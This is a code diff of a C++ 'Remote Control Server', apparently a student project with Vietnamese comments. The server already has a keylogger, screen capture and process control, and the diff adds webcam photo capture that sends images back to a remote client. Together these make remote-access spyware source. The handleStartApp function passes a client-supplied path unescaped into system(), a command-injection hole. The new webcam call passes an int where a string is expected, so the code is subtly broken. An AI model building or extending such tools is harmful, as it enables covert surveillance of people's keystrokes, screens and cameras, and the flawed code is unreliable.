@@ -4,7 +4,9 @@
 
 #ifdef _WIN32
     #include <gdiplus.h>
+    #include <vfw.h>          // Video for Windows - WEBCAM
     #pragma comment(lib, "gdiplus.lib")
+    #pragma comment(lib, "vfw32.lib") // Link VFW library
 #else
     #include <X11/Xlib.h>
     #include <X11/Xutil.h>
@@ -19,10 +21,14 @@ private:
     std::mutex keylogMutex;
     std::thread keylogThread;
     
+    // Webcam state
+    std::atomic<bool> webcamActive;
+    
 public:
     RemoteServer() : serverSocket(INVALID_SOCKET_VALUE), 
                      clientSocket(INVALID_SOCKET_VALUE),
-                     keyloggerActive(false) {
+                     keyloggerActive(false),
+                     webcamActive(false) {
         initWinsock();
     }
     
@@ -146,6 +152,10 @@ public:
                     handleWebcamOff();
                     break;
                     
+                case CMD_WEBCAM_CAPTURE:
+                    handleWebcamCapture(atoi(packet.data));  // N seconds
+                    break;
+                    
                 case CMD_SHUTDOWN:
                     handleShutdown();
                     break;
@@ -223,17 +233,14 @@ public:
     }
     
     // Function 3: Start an application
-void handleStartApp(const char* appPath) {
+    void handleStartApp(const char* appPath) {
         Packet response;
         response.command = CMD_START_APP;
         std::string result;
         
 #ifdef _WIN32
-        // Thêm "start " để nó chạy ở chế độ không đồng bộ (không khóa server)
-        // và dùng " " để xử lý đường dẫn có dấu cách
         std::string cmd = "start \"\" \"" + std::string(appPath) + "\"";
-        
-        int ret = system(cmd.c_str()); // Dùng system()
+        int ret = system(cmd.c_str());
         
         if (ret == 0) {
             result = "Application started successfully";
@@ -250,6 +257,7 @@ void handleStartApp(const char* appPath) {
         response.dataSize = result.length();
         sendPacket(clientSocket, response);
     }
+    
     // Function 4: List processes (Task Manager)
     void handleListProcesses() {
         Packet response;
@@ -334,7 +342,7 @@ void handleStartApp(const char* appPath) {
         sendPacket(clientSocket, response);
     }
     
-// Function 6: Take screenshot
+    // Function 6: Take screenshot
     void handleScreenshot() {
         Packet response;
         response.command = CMD_SCREENSHOT;
@@ -357,7 +365,6 @@ void handleStartApp(const char* appPath) {
         // Save to file
         std::string filename = "screenshot_" + std::to_string(time(0)) + ".bmp";
         
-        // --- (Code tạo file BMP của bạn vẫn giữ nguyên) ---
         BITMAPFILEHEADER bmfHeader;
         BITMAPINFOHEADER bi;
         
@@ -397,39 +404,28 @@ void handleStartApp(const char* appPath) {
         ReleaseDC(NULL, hScreenDC);
         DeleteObject(hBitmap);
 
-        // --- BẮT ĐẦU SỬA LOGIC ---
-        
-        // 2. Đọc file ảnh vừa lưu vào bộ nhớ
+        // Đọc file ảnh và gửi về
         std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
         if (imgFile.is_open()) {
             std::streamsize fileSize = imgFile.tellg();
             imgFile.seekg(0, std::ios::beg);
 
             if (fileSize > BUFFER_SIZE) {
-                // 3a. Nếu file ảnh quá lớn, gửi lỗi
                 result_message = "Screenshot failed: Image size is too large for buffer.";
                 strcpy(response.data, result_message.c_str());
                 response.dataSize = result_message.length();
             } else {
-                // 3b. Đọc dữ liệu ảnh vào response.data
                 imgFile.read(response.data, fileSize);
                 response.dataSize = static_cast<int>(fileSize);
-                // Gửi về dưới dạng dữ liệu nhị phân (ảnh BMP)
             }
             imgFile.close();
-
-            // 4. Xóa file ảnh tạm
             DeleteFileA(filename.c_str());
-
         } else {
             result_message = "Screenshot failed: Could not read temp file.";
             strcpy(response.data, result_message.c_str());
             response.dataSize = result_message.length();
         }
-        // --- KẾT THÚC SỬA LOGIC ---
-
 #else
-        // Linux screenshot (logic này vẫn lưu file, bạn có thể sửa tương tự)
         std::string filename = "screenshot_" + std::to_string(time(0)) + ".png";
         std::string cmd = "import -window root " + filename;
         int ret = system(cmd.c_str());
@@ -437,8 +433,6 @@ void handleStartApp(const char* appPath) {
         std::string result = (ret == 0) ? 
             "Screenshot saved: " + filename : "Failed to take screenshot";
         
-        // TODO: Đọc file "filename" và gửi về như logic của Windows ở trên
-        // Tạm thời vẫn gửi text
         strcpy(response.data, result.c_str());
         response.dataSize = result.length();
 #endif
@@ -483,13 +477,10 @@ void handleStartApp(const char* appPath) {
         
         std::lock_guard<std::mutex> lock(keylogMutex);
         if (keylogBuffer.length() >= BUFFER_SIZE) {
-            // Cắt bớt chuỗi nếu quá dài
-            // Copy (BUFFER_SIZE - 1) ký tự cuối cùng để xem log mới nhất
             std::string truncatedData = keylogBuffer.substr(keylogBuffer.length() - (BUFFER_SIZE - 1));
             strcpy(response.data, truncatedData.c_str());
             response.dataSize = truncatedData.length();
         } else {
-            // Nếu an toàn thì copy bình thường
             strcpy(response.data, keylogBuffer.c_str());
             response.dataSize = keylogBuffer.length();
         }
@@ -528,39 +519,167 @@ void handleStartApp(const char* appPath) {
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
         }
 #else
-        // Linux keylogger would require root privileges
-        // Simplified version
         while (keyloggerActive) {
             std::this_thread::sleep_for(std::chrono::milliseconds(100));
         }
 #endif
     }
     
-    // Function 10-11: Webcam control (simplified)
+    // ============ WEBCAM FUNCTIONS ============
+    
+    // Function 10: Turn on webcam (placeholder)
     void handleWebcamOn() {
         Packet response;
         response.command = CMD_WEBCAM_ON;
-        
-#ifdef _WIN32
-        // Use Windows Media Foundation or DirectShow
-        std::string result = "Webcam turned on (feature requires additional implementation)";
-#else
-        // Use V4L2 or OpenCV
-        std::string result = "Webcam turned on (feature requires additional implementation)";
-#endif
-        
+        webcamActive = true;
+        std::string result = "Webcam turned on. Use 'Capture' button to record video.";
         strcpy(response.data, result.c_str());
         response.dataSize = strlen(response.data);
         sendPacket(clientSocket, response);
     }
     
+    // Function 11: Turn off webcam
     void handleWebcamOff() {
         Packet response;
         response.command = CMD_WEBCAM_OFF;
+        webcamActive = false;
         std::string result = "Webcam turned off";
-        
         strcpy(response.data, result.c_str());
         response.dataSize = result.length();
+        sendPacket(clientSocket, response);
+    }
+    
+// Function 14: Capture webcam - CHỤP ẢNH TỪ WEBCAM (không cần FFmpeg)
+    void handleWebcamCapture(const char* data) {
+        Packet response;
+        response.command = CMD_WEBCAM_CAPTURE;
+        
+        // Parse số ảnh từ data (mặc định = 1 nếu không parse được)
+        int numPhotos = 1;
+        if (data != nullptr && strlen(data) > 0) {
+            numPhotos = atoi(data);
+        }
+        
+        std::cout << "[Server] Webcam capture requested, data: '" << (data ? data : "null") << "', numPhotos: " << numPhotos << std::endl;
+        
+        // Nếu numPhotos không hợp lệ, dùng mặc định là 1
+        if (numPhotos <= 0 || numPhotos > 10) {
+            numPhotos = 1;
+        }
+        
+        std::cout << "[Server] Capturing " << numPhotos << " photo(s) from webcam..." << std::endl;
+        
+#ifdef _WIN32
+        // ===== DÙNG VFW (Video for Windows) API - KHÔNG CẦN CÀI GÌ THÊM =====
+        
+        // Tìm webcam driver
+        HWND hWndCap = capCreateCaptureWindowA(
+            "WebcamCapture",        // Window name
+            WS_CHILD | WS_VISIBLE,  // Window style
+            0, 0, 640, 480,         // Position and size
+            GetDesktopWindow(),     // Parent window
+            0                       // ID
+        );
+        
+        if (!hWndCap) {
+            std::string result = "Failed to create capture window. Webcam may not be available.";
+            strcpy(response.data, result.c_str());
+            response.dataSize = result.length();
+            sendPacket(clientSocket, response);
+            return;
+        }
+        
+        // Kết nối đến webcam (driver 0)
+        bool connected = false;
+        for (int i = 0; i < 10; i++) {
+            if (capDriverConnect(hWndCap, i)) {
+                connected = true;
+                std::cout << "[Server] Connected to webcam driver " << i << std::endl;
+                break;
+            }
+        }
+        
+        if (!connected) {
+            DestroyWindow(hWndCap);
+            std::string result = "Failed to connect to webcam. Please check:\n"
+                                "1. Webcam is connected\n"
+                                "2. Webcam is not being used by another app\n"
+                                "3. Webcam drivers are installed";
+            strcpy(response.data, result.c_str());
+            response.dataSize = result.length();
+            sendPacket(clientSocket, response);
+            return;
+        }
+        
+        // Chụp ảnh
+        std::string filename = "webcam_capture_" + std::to_string(time(0)) + ".bmp";
+        
+        // Grab frame và save
+        capGrabFrame(hWndCap);
+        capFileSaveDIB(hWndCap, filename.c_str());
+        
+        // Ngắt kết nối webcam
+        capDriverDisconnect(hWndCap);
+        DestroyWindow(hWndCap);
+        
+        // Đọc file ảnh và gửi về
+        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
+        if (imgFile.is_open()) {
+            std::streamsize fileSize = imgFile.tellg();
+            imgFile.seekg(0, std::ios::beg);
+            
+            std::cout << "[Server] Webcam photo captured: " << fileSize << " bytes" << std::endl;
+            
+            if (fileSize > BUFFER_SIZE) {
+                std::string result = "Image too large for buffer.";
+                strcpy(response.data, result.c_str());
+                response.dataSize = result.length();
+            } else if (fileSize > 0) {
+                imgFile.read(response.data, fileSize);
+                response.dataSize = static_cast<int>(fileSize);
+            } else {
+                std::string result = "Captured image is empty. Webcam may not be working properly.";
+                strcpy(response.data, result.c_str());
+                response.dataSize = result.length();
+            }
+            imgFile.close();
+            DeleteFileA(filename.c_str());
+        } else {
+            std::string result = "Failed to capture webcam photo.";
+            strcpy(response.data, result.c_str());
+            response.dataSize = result.length();
+        }
+        
+#else
+        // Linux: Dùng fswebcam hoặc v4l2
+        std::string filename = "webcam_capture_" + std::to_string(time(0)) + ".jpg";
+        std::string cmd = "fswebcam -r 640x480 --no-banner " + filename + " 2>/dev/null";
+        int ret = system(cmd.c_str());
+        
+        if (ret != 0) {
+            // Thử với v4l2
+            cmd = "v4l2-ctl --device=/dev/video0 --stream-mmap --stream-count=1 --stream-to=" + filename;
+            ret = system(cmd.c_str());
+        }
+        
+        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
+        if (imgFile.is_open()) {
+            std::streamsize fileSize = imgFile.tellg();
+            imgFile.seekg(0, std::ios::beg);
+            
+            if (fileSize > 0 && fileSize <= BUFFER_SIZE) {
+                imgFile.read(response.data, fileSize);
+                response.dataSize = static_cast<int>(fileSize);
+            }
+            imgFile.close();
+            remove(filename.c_str());
+        } else {
+            std::string result = "Failed to capture. Install fswebcam: sudo apt install fswebcam";
+            strcpy(response.data, result.c_str());
+            response.dataSize = result.length();
+        }
+#endif
+        
         sendPacket(clientSocket, response);
     }
     
@@ -614,7 +733,8 @@ void handleStartApp(const char* appPath) {
 
 int main() {
     std::cout << "==================================" << std::endl;
-    std::cout << "   Remote Control Server v1.0    " << std::endl;
+    std::cout << "   Remote Control Server v2.0    " << std::endl;
+    std::cout << "   (with Webcam Support)         " << std::endl;
     std::cout << "==================================" << std::endl;
     
     RemoteServer server;
